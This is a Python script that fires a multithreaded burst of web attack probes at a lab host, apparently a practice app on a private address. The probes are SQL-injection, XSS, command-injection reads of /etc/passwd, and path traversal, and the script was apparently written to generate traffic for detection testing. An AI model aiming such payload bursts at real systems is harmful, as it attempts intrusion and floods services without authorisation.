import random
import sys
import os
import time
import http.client
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Target configuration
TARGET_HOST = "10.0.0.80"
TARGET_PORT = 3000

# Randomized curl commands as requested
CURL_COMMANDS = [
    f"curl -s -o /dev/null -w '%{{http_code}}' 'http://{TARGET_HOST}:{TARGET_PORT}/rest/products/search?q=1=1'",
    f"curl -s -o /dev/null -w '%{{http_code}}' 'http://{TARGET_HOST}:{TARGET_PORT}/rest/products/search?q=<script>alert(1)</script>'",
    f"curl -s -o /dev/null -w '%{{http_code}}' 'http://{TARGET_HOST}:{TARGET_PORT}/rest/products/search?q=cat+/etc/passwd'",
    f"curl -s -o /dev/null -w '%{{http_code}}' --path-as-is 'http://{TARGET_HOST}:{TARGET_PORT}/public/images/../../../../'"
]

def send_request(idx):
    """Sends a single randomized attack request using http.client and logs result."""
    paths = [
        "/rest/products/search?q=1=1",
        "/rest/products/search?q=<script>alert(1)</script>",
        "/rest/products/search?q=cat+/etc/passwd",
        "/public/images/../../../../"
    ]
    path = random.choice(paths)
    
    try:
        # Usiamo http.client per evitare il fork di curl che è pesantissimo
        conn = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT, timeout=5)
        conn.request("GET", path)
        res = conn.getresponse()
        status = res.status
        res.read() # Consuma la risposta
        conn.close()
    except Exception as e:
        print(f"[Attack {idx}] ERROR: {str(e)}", flush=True)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 attacker_burst.py <N>")
        sys.exit(1)
    
    try:
        n = int(sys.argv[1])
    except ValueError:
        print("Error: N must be an integer.")
        sys.exit(1)
    
    print(f"--- Attacker Diagnostic Burst START (N={n}) ---", flush=True)
    print(f"Target: {TARGET_HOST}:{TARGET_PORT}", flush=True)
    
    # Check connectivity first
    try:
        conn = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT, timeout=5)
        conn.request("GET", "/")
        res = conn.getresponse()
        print(f"Pre-burst connectivity test: HTTP {res.status}", flush=True)
        res.read()
        conn.close()
    except Exception as e:
        print(f"Pre-burst connectivity test FAILED: {str(e)}", flush=True)

    start_time = time.time()
    
    # Increase max_workers to 200 for better burst density in high-N scenarios
    max_workers = min(200, n)
    print(f"Firing {n} attacks using {max_workers} threads...", flush=True)
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for i in range(n):
            executor.submit(send_request, i)
            
    end_time = time.time()
    print(f"--- Attacker Diagnostic Burst END (Duration: {end_time - start_time:.2f}s) ---", flush=True)
    sys.stdout.flush()

if __name__ == "__main__":
    main()